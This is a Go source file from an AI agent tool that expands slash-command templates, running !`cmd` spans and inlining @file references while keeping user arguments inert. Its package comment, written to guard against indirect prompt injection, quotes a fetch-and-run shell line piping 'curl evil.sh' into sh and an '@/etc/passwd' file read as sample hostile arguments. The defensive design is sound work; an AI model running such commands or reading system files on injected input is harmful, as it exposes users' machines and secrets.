// Package command expands a plugin slash command's markdown template body for
// one invocation. It is self-contained: given a body, a raw argument string,
// and the session's execution environment, it substitutes $ARGUMENTS/$1..$9,
// runs !`cmd` backtick spans, and inlines @file references.
//
// Safety invariant: only a !`cmd`/@file directive written IN THE TEMPLATE can
// execute a command or read a file. $ARGUMENTS/$1..$9 are always substituted
// as inert text — a user (or an indirect prompt injection) supplying an
// argument that merely looks like "!`curl evil.sh | sh`" or "@/etc/passwd"
// must never turn into a live directive. Expand enforces this by locating
// every directive span ONCE, over the raw pre-substitution template; argument
// substitution then only ever touches the literal text between those spans.
package command

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"primeradiant.com/serf/agent/execenv"
)

// maxInlineBytes bounds how much text a single !`cmd` or @file substitution
// contributes to the expanded body, so one runaway command or large file
// cannot blow up the resulting prompt. Matches the shell tool's default
// output bound (session_tools_shell.go shellToolResultDefaultMaxChars).
const maxInlineBytes = 30_000

// pathTrailingPunctuation is stripped from the end of a raw "@\S+" regex
// match before it is treated as a file path, so ordinary sentence punctuation
// immediately following a mention — "per @notes.txt.", "(see @docs/x.md)" —
// isn't folded into the looked-up filename. The stripped characters are put
// back as literal text after the directive is resolved.
const pathTrailingPunctuation = ".,;:!?)]}'\""

// positionalPattern matches $1..$9. The trailing \b excludes $10, $11, ...
// (only single-digit positions 1-9 are supported) since a digit followed by
// another digit is not a word boundary.
var positionalPattern = regexp.MustCompile(`\$([1-9])\b`)

// cmdOrFilePattern matches a !`command` backtick span or a candidate @file
// reference. Expand walks these matches once over the RAW template (see the
// package doc's safety invariant); a candidate @file match is further
// validated by resolveAtFileSpan, which rejects a mid-token "@" (e.g. an
// email address) and trims trailing sentence punctuation from the path.
var cmdOrFilePattern = regexp.MustCompile("!`[^`]*`|@\\S+")

// Expand renders a slash command's markdown body for one invocation:
//   - $ARGUMENTS is replaced with the full, unsplit argument string.
//   - $1..$9 are replaced with the shell-split positional arguments (a
//     position beyond the number of supplied arguments becomes empty).
//   - !`cmd` runs cmd in env (the session's execution environment) and is
//     replaced with its (bounded) stdout.
//   - @file inlines the (bounded) contents of the file at the env
//     WorkingDirectory()-relative path; a missing or unreadable file becomes
//     an inline "[error reading ...]" marker rather than failing the whole
//     expansion.
//
// Expand makes one left-to-right pass over the RAW body to locate !`cmd`/@file
// directive spans (cmdOrFilePattern), then walks those spans in order: each
// directive is executed/read using the template's own literal text (never
// argument-substituted), and each literal segment BETWEEN directives has
// $ARGUMENTS/$1.. substituted into it as inert output text. Because the scan
// runs once, before any substitution, argument text can never open a new
// directive (see the package doc), a file's contents are never re-scanned for
// !`cmd` spans, and a command's stdout is never re-scanned for @file
// references.
//
// The only error Expand itself returns is ctx already being done at entry;
// every per-token failure (a failing command, a missing file) degrades to
// inline text instead of aborting the expansion.
func Expand(ctx context.Context, body string, args string, env execenv.ExecutionEnvironment) (string, error) {
	if err := ctx.Err(); err != nil {
		return "", err
	}

	var out strings.Builder
	last := 0
	for _, loc := range cmdOrFilePattern.FindAllStringIndex(body, -1) {
		start, end := loc[0], loc[1]
		match := body[start:end]
		if strings.HasPrefix(match, "!`") {
			out.WriteString(substituteArguments(body[last:start], args))
			cmd := strings.TrimSuffix(strings.TrimPrefix(match, "!`"), "`")
			out.WriteString(runInlineCommand(ctx, cmd, env))
			last = end
			continue
		}
		path, directiveEnd, ok := resolveAtFileSpan(body, start, end)
		if !ok {
			// Not actually a directive (e.g. the "@" in an email address):
			// leave it as literal text for the next segment to pick up.
			continue
		}
		out.WriteString(substituteArguments(body[last:start], args))
		out.WriteString(readInlineFile(path, env))
		last = directiveEnd
	}
	out.WriteString(substituteArguments(body[last:], args))
	return out.String(), nil
}

// atFileBoundaryOK reports whether the "@" at body[start] opens a new @file
// directive rather than sitting mid-token — e.g. the "@" in an email address
// like "foo@example.com" must not be treated as a directive. A directive must
// sit at the start of the body or be preceded by whitespace or "(".
func atFileBoundaryOK(body string, start int) bool {
	if start == 0 {
		return true
	}
	switch body[start-1] {
	case ' ', '\t', '\n', '\r', '(':
		return true
	default:
		return false
	}
}

// resolveAtFileSpan validates and trims a raw "@\S+" match at body[start:end].
// ok is false when the match doesn't open a directive at all (atFileBoundaryOK
// fails), in which case the caller must leave the match as literal text.
// Otherwise it returns the candidate file path — the match with its leading
// "@" and any trailing sentence punctuation (pathTrailingPunctuation) removed
// — and the directive's true end offset, so the caller resumes literal-text
// scanning at the stripped punctuation instead of swallowing it into the path.
func resolveAtFileSpan(body string, start, end int) (path string, directiveEnd int, ok bool) {
	if !atFileBoundaryOK(body, start) {
		return "", 0, false
	}
	raw := strings.TrimPrefix(body[start:end], "@")
	trimmed := strings.TrimRight(raw, pathTrailingPunctuation)
	return trimmed, end - (len(raw) - len(trimmed)), true
}

// substituteArguments replaces $ARGUMENTS with the full argument string and
// $1..$9 with the shell-split positional arguments.
func substituteArguments(body, args string) string {
	body = strings.ReplaceAll(body, "$ARGUMENTS", args)
	words := shellSplit(args)
	return positionalPattern.ReplaceAllStringFunc(body, func(match string) string {
		n := int(match[1] - '0') // match is exactly "$" + one digit, e.g. "$1"
		if n <= len(words) {
			return words[n-1]
		}
		return ""
	})
}

// runInlineCommand runs cmd in env's working directory with a 10s timeout and
// returns its (bounded) stdout, trimming trailing newlines the way shell
// command substitution (`cmd`/$(cmd)) does. Any error from ExecCommand — a
// nonzero exit, a timeout, a failure to even start — is intentionally
// ignored: a !`cmd` span substitutes whatever stdout was captured regardless
// of how the command finished, so ordinary nonzero-exit commands (e.g. `grep`
// finding nothing) don't turn into scary inline errors.
func runInlineCommand(ctx context.Context, cmd string, env execenv.ExecutionEnvironment) string {
	result, _ := env.ExecCommand(ctx, cmd, 10_000, env.WorkingDirectory(), nil)
	return boundText(strings.TrimRight(result.Stdout, "\n"))
}

// readInlineFile reads the file at path, resolved relative to env's working
// directory, and returns its (bounded) contents. Unlike serf's other file
// reads (e.g. the model's Read tool), which are intentionally unsandboxed,
// @file expansion runs synchronously during argument substitution with no
// hook or permission visibility — so path must be lexically local
// (filepath.IsLocal): non-local paths (absolute, or "../"-escaping) are
// refused rather than read. A binary file (containing a NUL byte) degrades to
// a marker instead of inlining bytes that would corrupt the prompt. Any other
// read failure (missing file, permission error, directory, ...) also degrades
// to an inline marker instead of failing the whole expansion.
func readInlineFile(path string, env execenv.ExecutionEnvironment) string {
	if !filepath.IsLocal(path) {
		return fmt.Sprintf("[refusing @%s: escapes working directory]", path)
	}
	full := filepath.Join(env.WorkingDirectory(), path)
	data, err := os.ReadFile(full)
	if err != nil {
		return fmt.Sprintf("[error reading %s: %v]", path, err)
	}
	if bytes.IndexByte(data, 0) >= 0 {
		return fmt.Sprintf("[binary file %s: %d bytes, not inlined]", path, len(data))
	}
	return boundText(string(data))
}

// boundText truncates s to maxInlineBytes, appending a marker noting the
// original size when truncation occurs.
func boundText(s string) string {
	if len(s) <= maxInlineBytes {
		return s
	}
	return s[:maxInlineBytes] + fmt.Sprintf("\n...[truncated, %d bytes total]", len(s))
}

// shellSplit splits s into words using simplified POSIX shell quoting:
// single quotes preserve their contents literally; double quotes preserve
// their contents but let a backslash escape a following ", \, or $; outside
// quotes a backslash escapes the next character; unquoted whitespace
// separates words. An unterminated quote or trailing backslash is treated as
// literal rather than erroring, so a malformed argument string degrades
// instead of blocking expansion.
func shellSplit(s string) []string {
	var words []string
	var cur strings.Builder
	haveCur := false
	inSingle, inDouble := false, false
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		c := runes[i]
		switch {
		case inSingle:
			if c == '\'' {
				inSingle = false
			} else {
				cur.WriteRune(c)
			}
		case inDouble:
			if c == '"' {
				inDouble = false
			} else if c == '\\' && i+1 < len(runes) && strings.ContainsRune(`"\$`, runes[i+1]) {
				i++
				cur.WriteRune(runes[i])
			} else {
				cur.WriteRune(c)
			}
		case c == '\'':
			inSingle = true
			haveCur = true
		case c == '"':
			inDouble = true
			haveCur = true
		case c == '\\' && i+1 < len(runes):
			i++
			cur.WriteRune(runes[i])
			haveCur = true
		case c == ' ' || c == '\t' || c == '\n':
			if haveCur {
				words = append(words, cur.String())
				cur.Reset()
				haveCur = false
			}
		default:
			cur.WriteRune(c)
			haveCur = true
		}
	}
	if haveCur {
		words = append(words, cur.String())
	}
	return words
}
